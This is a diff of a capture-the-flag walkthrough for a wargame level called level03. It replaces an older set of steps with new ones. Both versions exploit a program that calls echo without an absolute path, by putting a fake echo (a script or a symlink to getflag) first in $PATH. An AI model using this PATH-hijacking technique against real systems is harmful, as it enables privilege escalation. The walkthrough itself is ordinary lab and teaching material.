@@ -1,16 +1,13 @@
-# Download file and inspect the code with Ghidra
-`scp -P 4242 level03@<VM address>:level03 .`
+# Level03
 
-# Exploit call to echo with no absolut path by creating or custom script
-```bash
-mkdir /tmp/lol
-cat > /tmp/lol/echo
-#!/bin/bash
-getflag
-<ctrl + D>
-chmod 777 /tmp/lol/echo
-export PATH="/tmp/lol:$PAHT"
-```
+Download the level03 file on your local machine.
+>`scp -P 4242 level03@<VM address>:level03 .`
 
-# Get the flag
-`./level01`
+Use Ghidra to decompile the code.
+The program makes an unsecure to `echo` without specifying the absolut pat. We'll create a symlink to `getflag` and put it first in the `$PATH`.
+>`ln -s /bin/getflag /tmp/echo`
+
+>`export PATH="/tmp:$PATH"`
+
+Get the flag.
+>`./level03`
